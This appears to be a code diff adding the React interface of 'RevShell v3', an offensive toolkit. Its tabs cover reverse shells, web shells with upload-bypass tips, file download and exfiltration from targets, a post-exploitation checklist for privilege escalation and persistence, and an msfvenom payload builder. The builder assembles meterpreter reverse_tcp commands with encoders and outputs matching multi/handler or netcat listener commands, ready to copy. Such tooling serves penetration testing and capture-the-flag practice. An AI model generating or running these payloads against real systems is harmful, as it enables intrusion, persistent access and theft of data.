+                  <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:1,borderTop:"1px solid #0d1a0d",marginTop:10}}>
+                    <InfoRow icon="📁" label="SAVE AS" value={shell.filename} color="#00ffaa" mono copyable/>
+                    <InfoRow icon="▶" label="USAGE" value={shell.usage} color="#ffd700" mono copyable/>
+                    <InfoRow icon="👁" label="DETECTION RISK" value={shell.detection} color="#ff4444"/>
+                    <InfoRow icon="⬆" label="UPLOAD BYPASS TIP" value={shell.upload_tip} color="#88ff00"/>
+                  </div>
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════════════════
+   FILE TRANSFER TAB
+══════════════════════════════════════════════════════ */
+function FileTransferTab({ip,port}) {
+  const[section,setSection]=useState("serve");
+  const[active,setActive]=useState(null);
+  const SECTIONS=[
+    {id:"serve",label:"🖥 Serve Files",desc:"Host files on your attacker machine"},
+    {id:"linux_download",label:"🐧 Linux Download",desc:"Pull files onto a Linux target"},
+    {id:"windows_download",label:"⊞ Windows DL",desc:"Pull files onto a Windows target"},
+    {id:"exfil",label:"📤 Exfiltrate",desc:"Send files FROM target to attacker"},
+  ];
+  const methods=(FILE_TRANSFER[section]||[]).map(m=>({
+    ...m,
+    usage:m.usage
+      .replace(/ATTACKER/g,ip||"10.10.10.10")
+      .replace(/PORT/g,port||"8080")
+  }));
+  const TAG_COLORS={
+    http:"#00aaff",
+    smb:"#ffd700",
+    ssl:"#00ffaa",
+    nc:"#88ff00",
+    base64:"#ff8800",
+    "no-network":"#ff4444",
+    dns:"#aa44ff",
+    lolbin:"#ff6633",
+    ssh:"#00ccaa"
+  };
+  return(
+    <div style={{padding:"20px 22px"}}>
+      <div style={{marginBottom:16}}>
+        <h2 style={{color:"#cce8cc",fontSize:16,fontWeight:700,margin:"0 0 4px",fontFamily:"monospace",letterSpacing:1}}>📦 File Transfer Methods</h2>
+        <p style={{color:"#2a4a2a",fontSize:11,margin:0,lineHeight:1.6}}>How to move files to and from targets. ATTACKER IP and PORT sync from the header. Each method shows exact commands ready to copy.</p>
+      </div>
+      <div style={{background:"rgba(255,255,255,0.015)",border:"1px solid #0d1a0d",borderRadius:9,padding:"12px 16px",marginBottom:16}}>
+        <div style={{color:"#3a5a3a",fontSize:10,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:8}}>⚡ QUICK DECISION GUIDE</div>
+        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(230px,1fr))",gap:6}}>
+          {[["HTTP not blocked (Linux)","wget or curl download"],["HTTP not blocked (Windows)","PowerShell IWR or certutil"],["HTTP is blocked","SMB share (impacket) or /dev/tcp"],["No outbound network","Base64 encode → paste in shell"],["Need to receive files","python3 -m uploadserver"],["Stealthy exfil","DNS exfiltration or base64 through shell"]].map(([s,a])=>(
+            <div key={s} style={{fontSize:10,display:"flex",gap:6}}>
+              <span style={{color:"#1e3a1e",flexShrink:0}}>▸</span>
+              <span><span style={{color:"#4a7a4a"}}>{s}: </span><span style={{color:"#00ffaa88",fontFamily:"monospace"}}>{a}</span></span>
+            </div>
+          ))}
+        </div>
+      </div>
+      <div style={{display:"flex",gap:6,marginBottom:16,flexWrap:"wrap"}}>
+        {SECTIONS.map(s=>(
+          <button
+            key={s.id}
+            onClick={()=>{setSection(s.id);setActive(null);}}
+            style={{background:section===s.id?"rgba(0,255,170,0.08)":"rgba(255,255,255,0.02)",border:`1px solid ${section===s.id?"rgba(0,255,170,0.25)":"#1a2a1a"}`,borderRadius:7,color:section===s.id?"#00ffaa":"#3a5a3a",padding:"7px 14px",fontSize:11,cursor:"pointer",fontFamily:"monospace",transition:"all .15s",textAlign:"left"}}
+          >
+            <div>{s.label}</div>
+            <div style={{fontSize:9,color:section===s.id?"#00ffaa66":"#1e3a1e",marginTop:2}}>{s.desc}</div>
+          </button>
+        ))}
+      </div>
+      <div style={{display:"flex",flexDirection:"column",gap:6}}>
+        {methods.map(m=>{
+          const isActive=active===m.id;
+          return(
+            <div key={m.id} style={{background:isActive?"rgba(0,255,170,0.02)":"rgba(255,255,255,0.01)",border:`1px solid ${isActive?"rgba(0,255,170,0.2)":"#0d1a0d"}`,borderRadius:10,overflow:"hidden",transition:"border .15s"}}>
+              <div onClick={()=>setActive(p=>p===m.id?null:m.id)} style={{display:"flex",alignItems:"center",gap:10,padding:"10px 14px",cursor:"pointer",userSelect:"none"}}>
+                <div style={{width:7,height:7,borderRadius:"50%",flexShrink:0,background:isActive?"#00ffaa":"#0d1a0d",border:"1px solid rgba(0,255,170,0.25)",transition:"background .15s"}}/>
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{display:"flex",alignItems:"center",gap:6,flexWrap:"wrap"}}>
+                    <span style={{color:"#cce8cc",fontSize:13,fontWeight:600,fontFamily:"monospace"}}>{m.name}</span>
+                    <div style={{display:"flex",gap:3}}>{m.os?.map(o=><span key={o} title={OS_LABEL[o]} style={{fontSize:10}}>{OS_ICON[o]}</span>)}</div>
+                    <div style={{display:"flex",gap:4,flexWrap:"wrap"}}>{m.tags?.slice(0,3).map(t=>{const tc=TAG_COLORS[t];return tc?<span key={t} style={{fontSize:9,color:tc,background:`${tc}15`,border:`1px solid ${tc}33`,borderRadius:3,padding:"1px 5px",fontFamily:"monospace"}}>{t}</span>:null;})}</div>
+                  </div>
+                  <div style={{color:"#2a4a2a",fontSize:11,marginTop:2,fontFamily:"monospace",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{m.desc}</div>
+                </div>
+                <span style={{color:"#1e3a1e",fontSize:9}}>{isActive?"▲":"▼"}</span>
+              </div>
+              {isActive&&(
+                <div onClick={e=>e.stopPropagation()} style={{borderTop:"1px solid #0d1a0d",background:"rgba(0,0,0,0.2)"}}>
+                  <div style={{padding:"12px 14px 0",marginBottom:2}}><PayloadBox text={m.usage}/></div>
+                  <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:1,borderTop:"1px solid #0d1a0d",marginTop:10}}>
+                    <InfoRow icon="⚙" label="REQUIRES" value={m.req} color="#ffd700"/>
+                    <InfoRow icon="💡" label="NOTES" value={m.note} color="#88ff00"/>
+                  </div>
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════════════════
+   POST-EXPLOITATION TAB
+══════════════════════════════════════════════════════ */
+function PostExTab() {
+  const[targetOs,setTargetOs]=useState(null);
+  const[phase,setPhase]=useState("all");
+  const[completed,setCompleted]=useState({});
+  const[activeStep,setActiveStep]=useState(null);
+  const steps=targetOs?POSTEX_STEPS[targetOs]:[];
+  const phases=useMemo(()=>["all",...new Set(steps.map(s=>s.phase))],[steps]);
+  const filtered=useMemo(()=>phase==="all"?steps:steps.filter(s=>s.phase===phase),[steps,phase]);
+  const totalCmds=steps.reduce((a,s)=>a+s.commands.length,0);
+  const doneCmds=Object.values(completed).filter(Boolean).length;
+  const pct=totalCmds?Math.round(doneCmds/totalCmds*100):0;
+  const PHASE_COLORS={"Situational Awareness":"#00ffaa","Privilege Escalation":"#ff8800","Persistence":"#ff4444"};
+  const copyAll=step=>step.commands.map(c=>c.cmd).join("\n\n");
+  if(!targetOs)return(
+    <div style={{padding:"20px 22px"}}>
+      <h2 style={{color:"#cce8cc",fontSize:16,fontWeight:700,margin:"0 0 4px",fontFamily:"monospace",letterSpacing:1}}>🎯 Post-Exploitation Guide</h2>
+      <p style={{color:"#2a4a2a",fontSize:12,margin:"0 0 6px",lineHeight:1.7}}>Interactive step-by-step guide for after you catch a shell. Check off commands as you run them — progress is tracked.</p>
+      <p style={{color:"#1e3a1e",fontSize:11,margin:"0 0 28px",lineHeight:1.6}}>Covers: Situational Awareness → Privilege Escalation → Persistence</p>
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:14,maxWidth:520}}>
+        {[{id:"linux",icon:"🐧",label:"Linux / Unix",sub:"Bash shell — Ubuntu, RHEL, Alpine, containers…",steps:POSTEX_STEPS.linux.length,cmds:POSTEX_STEPS.linux.reduce((a,s)=>a+s.commands.length,0)},
+          {id:"windows",icon:"⊞",label:"Windows",sub:"cmd.exe / PowerShell — Windows Server, workstations…",steps:POSTEX_STEPS.windows.length,cmds:POSTEX_STEPS.windows.reduce((a,s)=>a+s.commands.length,0)}].map(o=>(
+          <button key={o.id} onClick={()=>setTargetOs(o.id)} style={{background:"rgba(255,255,255,0.02)",border:"1px solid #0e2a0e",borderRadius:12,padding:"20px",cursor:"pointer",textAlign:"left",transition:"border .2s,background .2s"}} onMouseEnter={e=>{e.currentTarget.style.background="rgba(0,255,170,0.04)";e.currentTarget.style.borderColor="rgba(0,255,170,0.2)";}} onMouseLeave={e=>{e.currentTarget.style.background="rgba(255,255,255,0.02)";e.currentTarget.style.borderColor="#0e2a0e";}}>
+            <div style={{fontSize:28,marginBottom:10}}>{o.icon}</div>
+            <div style={{color:"#cce8cc",fontSize:14,fontWeight:700,fontFamily:"monospace",marginBottom:4}}>{o.label}</div>
+            <div style={{color:"#2a4a2a",fontSize:11,marginBottom:12}}>{o.sub}</div>
+            <div style={{color:"#1e3a1e",fontSize:10,fontFamily:"monospace"}}>{o.steps} steps · {o.cmds} commands →</div>
+          </button>
+        ))}
+      </div>
+    </div>
+  );
+  return(
+    <div style={{padding:"20px 22px"}}>
+      <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:14,flexWrap:"wrap"}}>
+        <button onClick={()=>{setTargetOs(null);setCompleted({});setActiveStep(null);}} style={{background:"none",border:"1px solid #1a2a1a",borderRadius:6,color:"#3a5a3a",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>← Back</button>
+        <h2 style={{color:"#cce8cc",fontSize:15,fontWeight:700,margin:0,fontFamily:"monospace",flex:1}}>{targetOs==="linux"?"🐧":"⊞"} Post-Exploitation: {targetOs==="linux"?"Linux":"Windows"}</h2>
+        <button onClick={()=>setCompleted({})} style={{background:"none",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>Reset Progress</button>
+      </div>
+      <div style={{marginBottom:16}}>
+        <div style={{display:"flex",justifyContent:"space-between",marginBottom:5}}>
+          <span style={{fontSize:10,color:"#2a4a2a",fontFamily:"monospace"}}>CHECKLIST PROGRESS</span>
+          <span style={{fontSize:10,color:pct===100?"#00ffaa":"#3a5a3a",fontFamily:"monospace",fontWeight:700}}>{doneCmds}/{totalCmds} commands · {pct}%{pct===100?" ✓ Complete!":""}</span>
+        </div>
+        <div style={{height:5,background:"#0d1a0d",borderRadius:3,overflow:"hidden"}}>
+          <div style={{height:"100%",width:`${pct}%`,background:"linear-gradient(90deg,#00ffaa,#88ff00)",borderRadius:3,transition:"width .4s"}}/>
+        </div>
+      </div>
+      <div style={{display:"flex",gap:6,marginBottom:16,flexWrap:"wrap"}}>
+        {phases.map(p=><SelBtn key={p} label={p} active={phase===p} onClick={()=>setPhase(p)} color={PHASE_COLORS[p]||"#00ffaa"}/>)}
+      </div>
+      <div style={{display:"flex",flexDirection:"column",gap:6}}>
+        {filtered.map(step=>{
+          const isOpen=activeStep===step.id;
+          const stepDone=step.commands.filter(c=>completed[`${step.id}::${c.label}`]).length;
+          const allDone=stepDone===step.commands.length;
+          const pc=PHASE_COLORS[step.phase]||"#00ffaa";
+          return(
+            <div key={step.id} style={{background:allDone?"rgba(0,255,170,0.03)":isOpen?"rgba(255,255,255,0.02)":"rgba(255,255,255,0.01)",border:`1px solid ${allDone?"rgba(0,255,170,0.2)":isOpen?"#0e2e1e":"#0d1a0d"}`,borderRadius:10,overflow:"hidden",transition:"border .15s,background .15s"}}>
+              <div onClick={()=>setActiveStep(p=>p===step.id?null:step.id)} style={{display:"flex",alignItems:"center",gap:10,padding:"11px 14px",cursor:"pointer",userSelect:"none"}}>
+                <div style={{width:22,height:22,borderRadius:"50%",flexShrink:0,background:allDone?"rgba(0,255,170,0.15)":"rgba(255,255,255,0.03)",border:`2px solid ${allDone?"#00ffaa":"#1a3a1a"}`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:10,color:allDone?"#00ffaa":"transparent",transition:"all .2s"}}>✓</div>
+                <div style={{flex:1,minWidth:0}}>
+                  <div style={{display:"flex",alignItems:"center",gap:7,flexWrap:"wrap"}}>
+                    <span style={{fontSize:9,color:pc,background:`${pc}15`,border:`1px solid ${pc}33`,borderRadius:3,padding:"1px 6px",fontFamily:"monospace",letterSpacing:1,flexShrink:0}}>{step.phase.toUpperCase()}</span>
+                    <span style={{color:"#cce8cc",fontSize:13,fontWeight:600,fontFamily:"monospace",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{step.title}</span>
+                  </div>
+                  <div style={{color:"#2a4a2a",fontSize:11,marginTop:2,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{step.desc}</div>
+                </div>
+                <div style={{display:"flex",alignItems:"center",gap:8,flexShrink:0}}>
+                  <div style={{height:3,width:50,background:"#0d1a0d",borderRadius:2,overflow:"hidden"}}>
+                    <div style={{height:"100%",width:`${(stepDone/step.commands.length)*100}%`,background:pc,borderRadius:2,transition:"width .3s"}}/>
+                  </div>
+                  <span style={{fontSize:10,color:allDone?"#00ffaa":"#2a4a2a",fontFamily:"monospace"}}>{stepDone}/{step.commands.length}</span>
+                  <span style={{color:"#1e3a1e",fontSize:9}}>{isOpen?"▲":"▼"}</span>
+                </div>
+              </div>
+              {isOpen&&(
+                <div onClick={e=>e.stopPropagation()} style={{borderTop:"1px solid #0d1a0d",padding:"12px 14px",background:"rgba(0,0,0,0.15)"}}>
+                  <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:10}}>
+                    <p style={{color:"#3a5a3a",fontSize:11,margin:0,lineHeight:1.6,flex:1}}>{step.desc}</p>
+                    <CopyBtn text={copyAll(step)} label="⎘ COPY ALL" small/>
+                  </div>
+                  <div style={{display:"flex",flexDirection:"column",gap:7,marginBottom:14}}>
+                    {step.commands.map(cmd=>{
+                      const key=`${step.id}::${cmd.label}`;
+                      const done=!!completed[key];
+                      return(
+                        <div key={cmd.label} style={{background:done?"rgba(0,255,170,0.04)":"rgba(255,255,255,0.02)",border:`1px solid ${done?"rgba(0,255,170,0.15)":"#0d1a0d"}`,borderRadius:7,padding:"8px 10px",display:"flex",alignItems:"flex-start",gap:10,transition:"border .15s,background .15s"}}>
+                          <button onClick={()=>setCompleted(p=>({...p,[key]:!p[key]}))} style={{width:18,height:18,borderRadius:4,flexShrink:0,marginTop:2,background:done?"rgba(0,255,170,0.2)":"rgba(255,255,255,0.03)",border:`2px solid ${done?"#00ffaa":"#1a3a1a"}`,display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer",fontSize:10,color:done?"#00ffaa":"transparent",transition:"all .2s"}}>✓</button>
+                          <div style={{flex:1,minWidth:0}}>
+                            <div style={{color:done?"#4a7a4a":"#6a8a6a",fontSize:10,fontFamily:"monospace",marginBottom:4,textDecoration:done?"line-through":"none"}}>{cmd.label}</div>
+                            <div style={{display:"flex",alignItems:"flex-start",gap:6}}>
+                              <pre style={{flex:1,margin:0,background:"#040a04",border:"1px solid #0d1a0d",borderRadius:5,padding:"6px 8px",color:done?"#2a5a2a":"#00ffaa",fontFamily:"'Fira Code',monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.6,transition:"color .2s"}}>{cmd.cmd}</pre>
+                              <CopyBtn text={cmd.cmd} small/>
+                            </div>
+                          </div>
+                        </div>
+                      );
+                    })}
+                  </div>
+                  {step.tip&&<div style={{background:"rgba(0,255,170,0.03)",border:"1px solid rgba(0,255,170,0.1)",borderRadius:7,padding:"9px 12px",display:"flex",gap:8}}>
+                    <span style={{color:"#00ffaa",fontSize:12,flexShrink:0}}>💡</span>
+                    <span style={{fontSize:11,color:"#3a6a3a",lineHeight:1.5}}>{step.tip}</span>
+                  </div>}
+                </div>
+              )}
+            </div>
+          );
+        })}
+      </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════════════════
+   MSFVENOM TAB
+══════════════════════════════════════════════════════ */
+function MsfvenomTab({ip,port}){
+  const[os,setOs]=useState("windows");
+  const[pay,setPay]=useState("windows/x64/meterpreter/reverse_tcp");
+  const[fmt,setFmt]=useState("exe");
+  const[enc,setEnc]=useState("none");
+  const[iter,setIter]=useState("1");
+  const[out,setOut]=useState("shell");
+  const[bad,setBad]=useState("\\x00");
+  const[showSSL,setShowSSL]=useState(false);
+
+  useEffect(()=>{
+    const firstId=MSF_PAYLOADS[os]?.[0]?.id||"";
+    const firstFmt=MSF_FORMATS[os]?.[0]?.id||"raw";
+    setPay(firstId);
+    setFmt(firstFmt);
+  },[os]);
+
+  const payObj=useMemo(
+    ()=>MSF_PAYLOADS[os]?.find(p=>p.id===pay)||MSF_PAYLOADS[os]?.[0],
+    [os,pay]
+  );
+  const fmtObj=useMemo(
+    ()=>MSF_FORMATS[os]?.find(f=>f.id===fmt)||MSF_FORMATS[os]?.[0],
+    [os,fmt]
+  );
+
+  const cmd=useMemo(()=>{
+    const parts=[
+      "msfvenom",
+      `-p ${pay}`,
+      `LHOST=${ip||"10.10.10.10"}`,
+      `LPORT=${port||"4444"}`
+    ];
+    if(bad)parts.push(`-b "${bad}"`);
+    if(enc!=="none")parts.push(`-e ${enc}`,`-i ${iter||"1"}`);
+    parts.push(`-f ${fmt}`,`-o ${out||"shell"}${fmtObj?.ext||""}`);
+    return parts.join(" \\\n  ");
+  },[pay,ip,port,bad,enc,iter,fmt,out,fmtObj]);
+
+  const listenerCmd=useMemo(()=>{
+    const isMeter=pay.includes("meterpreter");
+    const isHttps=pay.includes("https");
+    if(!isMeter)return `nc -lvnp ${port||"4444"}`;
+    return `msfconsole -q -x "use multi/handler; set PAYLOAD ${pay}; set LHOST ${ip||"10.10.10.10"}; set LPORT ${port||"4444"}; ${isHttps?"set HANDLERSSLCERT cert.pem; ":""}exploit"`;
+  },[pay,ip,port]);
+
+  const isHttps=pay.includes("https");
+
+  return (
+    <div style={{padding:"20px 22px",maxWidth:920}}>
+      <h2 style={{color:"#cce8cc",fontSize:16,fontWeight:700,margin:"0 0 4px",fontFamily:"monospace",letterSpacing:1}}>
+        ⚔ MSFvenom Payload Builder
+      </h2>
+      <p style={{color:"#2a4a2a",fontSize:11,margin:"0 0 18px",lineHeight:1.6}}>
+        Build msfvenom commands for staged and stageless payloads. LHOST/LPORT sync from the header.
+      </p>
+
+      {isHttps&&(
+        <div style={{background:"rgba(0,170,255,0.04)",border:"1px solid rgba(0,170,255,0.15)",borderRadius:8,padding:"10px 14px",marginBottom:16,display:"flex",justifyContent:"space-between",alignItems:"center"}}>
+          <span style={{color:"#0088cc",fontSize:11}}>
+            🔒 HTTPS payload — you need an SSL certificate.
+          </span>
+          <button
+            onClick={()=>setShowSSL(v=>!v)}
+            style={{background:"rgba(0,170,255,0.1)",border:"1px solid rgba(0,170,255,0.25)",borderRadius:6,color:"#00aaff",padding:"4px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}
+          >
+            {showSSL?"Hide SSL Guide":"Show SSL Guide"}
+          </button>
+        </div>
+      )}
+
+      {showSSL&&<SSLPanel ip={ip}/>}
+
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:18,marginBottom:16}}>
+        <div style={{display:"flex",flexDirection:"column",gap:14}}>
+          <div>
+            <SL>TARGET OS</SL>
+            <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>
+              {Object.keys(MSF_PAYLOADS).map(o=>(
+                <SelBtn
+                  key={o}
+                  label={{linux:"🐧 Linux",windows:"⊞ Windows",macos:"⌘ macOS",web:"🌐 Web"}[o]}
+                  active={os===o}
+                  onClick={()=>setOs(o)}
+                />
+              ))}
+            </div>
+          </div>
+
+          <div>
+            <SL>PAYLOAD</SL>
+            <select
+              value={pay}
+              onChange={e=>setPay(e.target.value)}
+              style={{...IS,width:"100%",appearance:"none"}}
+            >
+              {MSF_PAYLOADS[os]?.map(p=>(
+                <option key={p.id} value={p.id}>{p.label}</option>
+              ))}
+            </select>
+            {payObj&&(
+              <div style={{marginTop:5,display:"flex",gap:6}}>
+                <span style={{fontSize:9,color:"#2a5a2a",background:"rgba(255,255,255,0.03)",border:"1px solid #1a2a1a",borderRadius:3,padding:"2px 6px",fontFamily:"monospace"}}>
+                  {payObj.arch}
+                </span>
+                <span style={{fontSize:9,color:payObj.staged?"#ffd700":"#88ff00",background:"rgba(255,255,255,0.03)",border:"1px solid #1a2a1a",borderRadius:3,padding:"2px 6px",fontFamily:"monospace"}}>
+                  {payObj.staged?"staged — needs multi/handler":"stageless — nc works"}
+                </span>
+              </div>
+            )}
+          </div>
+
+          <div>
+            <SL>OUTPUT FORMAT</SL>
+            <select
+              value={fmt}
+              onChange={e=>setFmt(e.target.value)}
+              style={{...IS,width:"100%",appearance:"none"}}
+            >
+              {MSF_FORMATS[os]?.map(f=>(
+                <option key={f.id} value={f.id}>{f.label}</option>
+              ))}
+            </select>
+            {fmtObj&&(
+              <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
+                {fmtObj.note}
+              </p>
+            )}
+          </div>
+        </div>
+
+        <div style={{display:"flex",flexDirection:"column",gap:14}}>
+          <div>
+            <SL>ENCODER</SL>
+            <select
+              value={enc}
+              onChange={e=>setEnc(e.target.value)}
+              style={{...IS,width:"100%",appearance:"none"}}
+            >
+              {MSF_ENCODERS.map(e=>(
+                <option key={e.id} value={e.id}>{e.label}</option>
+              ))}
+            </select>
+            {enc!=="none"&&(
+              <p style={{fontSize:10,color:"#554400",margin:"4px 0 0"}}>
+                ⚠ Encoding ≠ encryption. Modern EDR bypasses it easily.
+              </p>
+            )}
+          </div>
+
+          <div>
+            <SL>ITERATIONS {enc==="none"&&"(encoder off)"}</SL>
+            <input
+              value={iter}
+              onChange={e=>setIter(e.target.value)}
+              disabled={enc==="none"}
+              style={{...IS,width:"100%",opacity:enc==="none"?0.4:1}}
+              placeholder="1"
+            />
+            <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
+              3–5 iterations are typical; higher values grow the payload.
+            </p>
+          </div>
+
+          <div>
+            <SL>OUTPUT FILENAME</SL>
+            <input
+              value={out}
+              onChange={e=>setOut(e.target.value)}
+              style={{...IS,width:"100%"}}
+              placeholder="shell"
+            />
+            <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
+              Final name: {(out||"shell")}{fmtObj?.ext||""}
+            </p>
+          </div>
+
+          <div>
+            <SL>BAD CHARACTERS</SL>
+            <input
+              value={bad}
+              onChange={e=>setBad(e.target.value)}
+              style={{...IS,width:"100%"}}
+              placeholder="\\x00"
+            />
+            <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
+              Leave blank for none. Common: \x00 \x0a \x0d.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <div style={{display:"grid",gridTemplateColumns:"1.4fr 1fr",gap:14}}>
+        <div>
+          <SL>MSFVENOM COMMAND</SL>
+          <div style={{display:"flex",gap:8,alignItems:"flex-start"}}>
+            <pre style={{flex:1,margin:0,background:"#040a04",border:"1px solid #0d1a0d",borderRadius:6,padding:"8px 10px",color:"#00ffaa",fontFamily:"'Fira Code',monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.7}}>
+{cmd}
+            </pre>
+            <CopyBtn text={cmd}/>
+          </div>
+        </div>
+        <div>
+          <SL>RECOMMENDED LISTENER</SL>
+          <div style={{display:"flex",gap:8,alignItems:"flex-start"}}>
+            <pre style={{flex:1,margin:0,background:"#040a04",border:"1px solid #0d1a0d",borderRadius:6,padding:"8px 10px",color:"#88cc88",fontFamily:"'Fira Code',monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-word",lineHeight:1.7}}>
+{listenerCmd}
+            </pre>
+            <CopyBtn text={listenerCmd}/>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+/* ══════════════════════════════════════════════════════
+   ROOT APP
+══════════════════════════════════════════════════════ */
+function App(){
+  const[ip,setIp]=useLS("rvs3_ip","10.10.10.10");
+  const[port,setPort]=useLS("rvs3_port","4444");
+  const[tab,setTab]=useState("shells");
+  const[cursor,setCursor]=useState(true);
+  const[showFlow,setShowFlow]=useState(false);
+  const[showAI,setShowAI]=useState(false);
+  const[showKeys,setShowKeys]=useState(false);
+  const[showHistory,setShowHistory]=useState(false);
+  const[showDiff,setShowDiff]=useState(false);
+  const[favorites,setFavorites]=useLS("rvs3_favs",[]);
+  const[customShells,setCustomShells]=useLS("rvs3_custom_shells",[]);
+  const[history,setHistory]=useLS("rvs3_history",[]);
+  const[toast,setToast]=useState({visible:false,msg:""});
+
+  useEffect(()=>{
+    window.__toast=(msg)=>{
+      setToast({visible:true,msg});
+      setTimeout(()=>setToast(t=>({...t,visible:false})),2200);
+    };
+  },[]);
+
+  useEffect(()=>{
+    const t=setInterval(()=>setCursor(v=>!v),550);
+    return()=>clearInterval(t);
+  },[]);
+
+  useEffect(()=>{
+    const h=e=>{
+      const tag=(document.activeElement&&document.activeElement.tagName)||"";
+      if(tag==="INPUT"||tag==="TEXTAREA")return;
+      if(e.key==="?")setShowKeys(true);
+      if(e.key==="1")setTab("shells");
+      if(e.key==="2")setTab("msf");
+      if(e.key==="3")setTab("webshell");
+      if(e.key==="4")setTab("filetx");
+      if(e.key==="5")setTab("postex");
+      if(e.key==="H"||e.key==="h")setShowHistory(v=>!v);
+      if(e.key==="D"||e.key==="d")setShowDiff(true);
+      if(e.key==="P"||e.key==="p")window.print();
+    };
+    window.addEventListener("keydown",h);
+    return()=>window.removeEventListener("keydown",h);
+  },[]);
+
+  const toggleFav=useCallback(
+    id=>setFavorites(prev=>prev.includes(id)?prev.filter(x=>x!==id):[...prev,id]),
+    [setFavorites]
+  );
+
+  const addHistory=useCallback(
+    item=>setHistory(prev=>{
+      const next=[...prev,item];
+      return next.slice(-20);
+    }),
+    [setHistory]
+  );
+
+  const addCustomShell=useCallback(
+    shell=>setCustomShells(prev=>[...prev,shell]),
+    [setCustomShells]
+  );
+
+  const clearHistory=useCallback(
+    ()=>setHistory([]),
+    [setHistory]
+  );
+
+  const ipValid=/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)||/^[a-zA-Z0-9.\-]+$/.test(ip);
+  const portValid=/^\d+$/.test(port)&&parseInt(port,10)>0&&parseInt(port,10)<=65535;
+
+  const tabDefs=[
+    {id:"shells",icon:"⚡",label:"Reverse Shells",badge:SHELLS_BASE.length+customShells.length},
+    {id:"msf",icon:"⚔",label:"MSFvenom",badge:Object.values(MSF_PAYLOADS).flat().length},
+    {id:"webshell",icon:"🐚",label:"Web Shells",badge:WEB_SHELLS.length},
+    {id:"filetx",icon:"📦",label:"File Transfer",badge:Object.values(FILE_TRANSFER).flat().length},
+    {id:"postex",icon:"🎯",label:"Post-Exploitation",badge:null},
+  ];
+
+  return (
+    <div style={{minHeight:"100vh",background:"#060c06",color:"#b8ccb8",fontFamily:"'Fira Code','Cascadia Code','JetBrains Mono',monospace,sans-serif",display:"flex",flexDirection:"column"}}>
+      {/* HEADER */}
+      <header style={{position:"sticky",top:0,zIndex:200,background:"rgba(3,6,3,0.97)",backdropFilter:"blur(12px)",borderBottom:"1px solid #0a140a"}}>
+        <div style={{height:52,display:"flex",alignItems:"center",padding:"0 16px",gap:8,boxSizing:"border-box",borderBottom:"1px solid #080e08",flexWrap:"nowrap",overflow:"hidden"}}>
+          <div style={{display:"flex",alignItems:"center",gap:7,flexShrink:0}}>
+            <span style={{width:25,height:25,borderRadius:5,background:"linear-gradient(135deg,#00ffaa14,#00ffaa28)",border:"1px solid rgba(0,255,170,0.3)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:12}}>⚡</span>
+            <span style={{fontSize:14,fontWeight:700,color:"#cce8cc",letterSpacing:1}}>RevShell</span>
+            <span style={{fontSize:9,color:"#00ffaa",background:"rgba(0,255,170,0.07)",border:"1px solid rgba(0,255,170,0.2)",borderRadius:3,padding:"1px 6px",letterSpacing:2,fontWeight:700}}>v3</span>
+          </div>
+          <div style={{flex:1}}/>
+          <div style={{display:"flex",gap:3,alignItems:"center",flexShrink:0}}>
+            <span style={{color:"#162a16",fontSize:9,letterSpacing:1,marginRight:2}}>QUICK:</span>
+            {PORT_PRESETS.map(p=>(
+              <button
+                key={p.p}
+                onClick={()=>setPort(p.p)}
+                title={p.note}
+                style={{background:port===p.p?"rgba(0,255,170,0.1)":"rgba(255,255,255,0.02)",border:`1px solid ${port===p.p?"rgba(0,255,170,0.3)":"#0d1a0d"}`,borderRadius:5,color:port===p.p?"#00ffaa":"#2a4a2a",padding:"3px 6px",fontSize:9,cursor:"pointer",fontFamily:"monospace",transition:"all .15s"}}
+              >
+                {p.p}
+              </button>
+            ))}
+          </div>
+          <div style={{display:"flex",alignItems:"center",gap:5,flexShrink:0}}>
+            <span style={{color:"#1e3a1e",fontSize:10,letterSpacing:1,whiteSpace:"nowrap"}}>LHOST</span>
+            <div style={{position:"relative"}}>
+              <input
+                value={ip}
+                onChange={e=>setIp(e.target.value)}
+                placeholder="10.10.10.10"
+                style={{...IS,width:140,borderColor:ip&&!ipValid?"rgba(255,68,68,0.5)":"#1a2a1a"}}
+                onFocus={e=>{e.target.style.borderColor="rgba(0,255,170,0.35)";}}
+                onBlur={e=>{e.target.style.borderColor=ip&&!ipValid?"rgba(255,68,68,0.5)":"#1a2a1a";}}
+              />
